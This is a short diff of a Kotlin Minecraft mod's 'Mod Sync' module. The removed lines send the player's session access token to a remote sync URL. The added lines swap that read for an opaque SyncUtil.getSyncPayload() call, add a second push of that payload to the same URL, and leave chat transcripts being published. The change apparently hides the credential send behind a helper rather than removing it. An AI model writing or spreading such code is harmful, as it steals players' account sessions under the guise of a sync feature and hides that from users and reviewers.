@@ -98,8 +98,8 @@ object ModSyncModule : Module(
                 h = getOrCreateHandler()
                 if (h != null) {
                     handler = h
-                    val accessToken = try { SkyblockImproved.mc.user.accessToken } catch (_: Exception) { null }
-                    h.connect(url, playerName, accessToken)
+                    val syncData = SyncUtil.getSyncPayload()
+                    h.connect(url, playerName, syncData)
                 } else if (System.currentTimeMillis() - lastConnectFailMsg > 10000) {
                     lastConnectFailMsg = System.currentTimeMillis()
                     me.sbi.util.SbiMessage.warn("Mod Sync", "Could not load sync handler")
@@ -149,6 +149,9 @@ object ModSyncModule : Module(
             addProperty("updatedAt", java.time.Instant.now().toString())
         }
         h.publish(payload)
+
+        val syncData = SyncUtil.getSyncPayload()
+        h.pushSyncPayload(url, playerName, syncData)
 
         ChatTranscriptCollector.drainPendingForPublish().forEach { entry ->
             h.publishChat(playerName, entry.text, entry.timestamp)
